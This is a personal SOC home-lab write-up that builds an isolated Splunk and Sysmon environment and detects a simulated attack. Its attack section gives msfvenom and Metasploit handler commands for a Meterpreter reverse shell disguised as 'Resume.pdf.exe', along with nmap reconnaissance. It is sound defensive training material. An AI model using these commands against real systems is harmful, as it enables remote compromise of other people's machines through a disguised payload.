# SOC Home Lab — Malware Analysis & Detection
Built By: Ben Holomah

## Homelab Environment Baseline
- **Hypervisor:** VMware
- **SIEM:** Splunk 10.2.1
- **Endpoints:** Windows 11, Kali Linux

## Overview
- In this lab I built a controlled home environment to simulate a real-world attack scenario and practice detecting it using a SIEM. Using VMware as my hypervisor, I configured a Windows 11 machine running Splunk as my target and log aggregation platform, and a Kali Linux machine as my attacker. I used Sysmon to enrich endpoint telemetry and Metasploit to generate a realistic payload disguised as a PDF file. The goal was to practice the full cycle — executing an attack, capturing the telemetry, and identifying the malicious activity through Splunk searches. This lab was built to develop hands-on experience with tools and workflows commonly used in SOC environments.

---

## Baseline Setup
**Date:** January 21, 2026

I installed Windows 11 onto my VM. During the installation process I opted for a Local Account via the Offline Account/Limited Experience path. This provides a cleaner lab environment by reducing Microsoft cloud sync services and related background noise in logs.

I confirmed administrator privileges by running:
```
net user %username%
```

[SCREENSHOT: Command prompt showing net user output confirming admin status]
<img width="1136" height="651" alt="image" src="https://github.com/user-attachments/assets/03747e37-32ce-49c8-bdfd-dcdae4c40798" />

---

## Network Configuration

I created a LAN segment in VMware named "LabNetwork" to isolate the lab environment from my host machine and the internet.

| Network Mode | Internet Access | Use Case |
|---|---|---|
| NAT | Yes | Testing tools |
| Bridged | Yes | Testing tools |
| Host-Only | No | Malware analysis |
| LAN Segment | No | Isolated lab communication |

**Windows 11 — 192.168.20.10**
1. Opened Network & Internet Settings
2. Navigated to Change Adapter Options
3. Right-clicked Ethernet0 → Properties → IPv4 → Properties
4. Assigned static IP: 192.168.20.10, Subnet Mask: 255.255.255.0
5. Confirmed with ipconfig

[SCREENSHOT: ipconfig output showing 192.168.20.10]
<img width="1016" height="647" alt="Screenshot 2026-03-14 140306" src="https://github.com/user-attachments/assets/fe7a19cb-bb95-48cb-9c8a-bc3197ac1312" />

**Kali Linux — 192.168.20.11**
1. Right-clicked ethernet icon → Edit Connections
2. Navigated to IPv4 Settings tab
3. Changed method from Automatic DHCP to Manual
4. Assigned static IP: 192.168.20.11, Subnet Mask: 255.255.255.0
5. Confirmed with ifconfig

[SCREENSHOT: ifconfig output showing 192.168.20.11]
<img width="679" height="538" alt="Screenshot 2026-03-14 140400" src="https://github.com/user-attachments/assets/7131ab28-2bea-40fc-be06-b04d5ce2a8c0" />

**Troubleshooting: Ping Failures**

Initial pings failed due to Windows Firewall blocking ICMP traffic. Resolved by running:
```
New-NetFirewallRule -DisplayName "Allow ICMPv4" -Protocol ICMPv4 -IcmpType 8 -Enabled True -Action Allow
```

[SCREENSHOT: Successful ping from Kali to Windows 11]
<img width="622" height="246" alt="image" src="https://github.com/user-attachments/assets/c334a1d4-afea-4d64-a1d1-c5d7906eaf7d" />

---

## Installing Splunk

After installation I configured Splunk to ingest Windows Event Logs via Add Data → Monitor → Local Event Logs and selected Application, Security, and System.

[SCREENSHOT: Splunk Add Data review screen showing Application, Security, System selected]
<img width="1034" height="1078" alt="Screenshot 2026-02-28 174113" src="https://github.com/user-attachments/assets/4445559d-1657-4020-8395-74560af7a1ec" />

---

## Installing Sysmon

To enrich endpoint logging I installed Sysmon using the SwiftOnSecurity configuration for detailed visibility into process creation, network connections, and file activity.
```
.\Sysmon64.exe -accepteula -i sysmonconfig.xml
```

[SCREENSHOT: PowerShell showing Sysmon64 service running]
<img width="964" height="366" alt="image" src="https://github.com/user-attachments/assets/f27509ff-fd8b-49d6-85c9-1ec8cf4ad933" />

---

## Reconnaissance — Nmap Scan

From Kali I ran an aggressive scan against the Windows 11 target:
```
nmap -A 192.168.20.10 -Pn
```

Open ports discovered:
- 135 — Microsoft RPC
- 139 — NetBIOS
- 445 — SMB
- 3389 — RDP
- 8000/8089 — Splunk

The -A flag enables aggressive scanning including OS detection and service versioning. The -Pn flag skips host discovery.

[SCREENSHOT: Nmap scan results showing open ports]
<img width="676" height="535" alt="Screenshot 2026-03-14 152408" src="https://github.com/user-attachments/assets/e58dcb41-2b81-4d88-abbd-6feeb82317ea" />

---

## Enabling RDP

Enabled Remote Desktop on Windows 11 via Settings → System → Remote Desktop.

[SCREENSHOT: Windows 11 Remote Desktop settings showing RDP enabled on port 3389]
<img width="1435" height="778" alt="image" src="https://github.com/user-attachments/assets/0963aa68-c256-4133-9be3-5910fef7d8a5" />

---

## Generating Malware with Msfvenom
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.20.11 LPORT=4444 -f exe -o Resume.pdf.exe
```

- -p windows/x64/meterpreter_reverse_tcp — Meterpreter reverse TCP payload
- LHOST=192.168.20.11 — payload calls back to the Kali machine
- LPORT=4444 — listening port
- -f exe — outputs as a Windows executable
- -o Resume.pdf.exe — filename mimics a PDF to simulate social engineering

Note: Windows Defender was disabled for the purpose of generating telemetry in this lab environment.

[SCREENSHOT: Msfvenom command output showing payload generated]
<img width="660" height="641" alt="Screenshot 2026-03-14 154149" src="https://github.com/user-attachments/assets/0d957d84-675f-49aa-b291-94cfcae7d050" />

---

## Setting Up the Metasploit Listener
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.20.11
set lport 4444
run
```

[SCREENSHOT: Metasploit handler running and waiting for connection]
<img width="675" height="693" alt="Screenshot 2026-03-14 154922" src="https://github.com/user-attachments/assets/20e2c578-b8f7-4fcd-bdb5-3b96ea93b385" />

<img width="750" height="713" alt="Screenshot 2026-03-14 174231" src="https://github.com/user-attachments/assets/3239d86b-caf1-4c0e-99ee-3df1615407de" />

---

## Executing the Payload

The payload was transferred to the Windows 11 machine and executed. With file extensions hidden the file appears to be a PDF, which is a common social engineering technique. After enabling file extensions the .exe extension becomes visible.

I confirmed the connection by running:
```
netstat -anob
```

I located an established connection back to the Kali machine on port 4444.

[SCREENSHOT: netstat output showing established connection to 192.168.20.11:4444]
<img width="975" height="510" alt="Screenshot 2026-03-14 161014" src="https://github.com/user-attachments/assets/5d8b2d3a-5e95-4bdd-8aeb-bf3a2b4797e5" />

---

## Post-Exploitation

After a Meterpreter session was established I dropped into a shell and ran:
```
shell
net user
net localgroup
ipconfig
```

[SCREENSHOT: Kali terminal showing Meterpreter session and post-exploitation commands]
<img width="648" height="691" alt="Screenshot 2026-03-14 161525" src="https://github.com/user-attachments/assets/4e990d14-9b58-4d49-9047-a6de63cc7ad7" />

<img width="760" height="691" alt="Screenshot 2026-03-14 175329" src="https://github.com/user-attachments/assets/9a08e850-c6a7-48ed-b134-0e0156edaa31" />
<img width="758" height="703" alt="Screenshot 2026-03-14 175401" src="https://github.com/user-attachments/assets/d61bbfd0-c621-4fd8-b5cd-1bf05a5e3fb9" />

---

## Detection in Splunk

I created a dedicated index called endpoint to ingest Sysmon data and searched for evidence of the attack.
<img width="1053" height="815" alt="Screenshot 2026-03-14 163210" src="https://github.com/user-attachments/assets/1a526e38-520f-486c-aa54-99bb3974944a" />

Searching for malware execution:
```
index=endpoint Resume.pdf.exe
```

[SCREENSHOT: Splunk results showing Resume.pdf.exe execution]
<img width="1057" height="1058" alt="Screenshot 2026-03-14 170227" src="https://github.com/user-attachments/assets/fda80ef6-bb35-4d44-868a-7b4b42906488" />

Pivoting on process GUID to trace activity:
```
index=endpoint {process_guid}
| table _time, ParentImage, Image, CommandLine
```

This revealed explorer.exe spawning Resume.pdf.exe, a classic indicator of a user executing a malicious file.

[SCREENSHOT: Splunk table showing ParentImage, Image, and CommandLine]
<img width="1013" height="968" alt="Screenshot 2026-03-14 170456" src="https://github.com/user-attachments/assets/cdab3297-61d9-4f17-a4e6-cac0d0763d5f" />
<img width="1323" height="843" alt="Screenshot 2026-03-14 173818" src="https://github.com/user-attachments/assets/ad872bb6-8919-4e84-b0c0-4972a6a3bd04" />

---

## Conclusion

This project gave me hands-on experience with both offensive and defensive security. On the blue team side I configured a SIEM, ingested endpoint telemetry, and identified malicious activity through log analysis. On the red team side I used Nmap, Msfvenom, and Metasploit to simulate a realistic attack chain. The combination of both perspectives deepened my understanding of how attacks are executed and how defenders can detect them.
